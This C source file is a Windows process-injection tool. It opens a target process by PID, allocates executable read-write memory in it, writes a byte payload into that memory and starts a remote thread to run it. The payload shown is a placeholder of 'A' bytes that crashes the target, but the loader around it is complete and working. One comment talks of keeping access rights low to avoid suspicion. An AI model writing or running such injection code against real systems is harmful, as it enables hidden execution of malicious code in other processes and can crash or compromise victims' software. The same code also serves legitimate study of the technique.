#include <Windows.h>
#include <stdio.h>

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char crashCode[] = "\x41\x41\x41\x41\x41\x41\x41\x41"; // Crashes program

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

int main(int argc, char* argv[]) {

    if(argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]); // argv[0] is almost always the program name, not PID
    printf("%s trying to open a handle to process (%ld)\n", i, PID); // %ld is how you format a DWORD

    // Open a handle to the process
    hProcess = OpenProcess( // Desired access level of the memory (the less, the better: less suspicion
            PROCESS_ALL_ACCESS,
            FALSE,
            PID
            ); // Returns open handle to process, otherwise NULL

    if(hProcess == NULL) {
        printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);

    // Allocate bytes to process memory
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crashCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (rBuffer == NULL) {
        printf("%s failed to allocate memory in the remote process, error: %ld\n", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(crashCode));

    // Write allocated memory to process memory
    if (!WriteProcessMemory(hProcess, rBuffer, crashCode, sizeof(crashCode), NULL)) {
        printf("%s failed to write to process memory, error: %ld\n", e, GetLastError());
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(crashCode));

    // Create thread to run payload
    hThread = CreateRemoteThreadEx(
            hProcess,NULL,0,
            (LPTHREAD_START_ROUTINE)rBuffer,NULL,0,0,&TID);

    if(hThread == NULL) {
        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

    // Wait for thread to finish before clearing processes
    printf("%s waiting for thread to finish...\n", i);
    WaitForSingleObject(hThread, 100000);

    // Clean up all processes
    printf("%s cleaning up\n", i);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    printf("%s finished!", k);

    return EXIT_SUCCESS;
}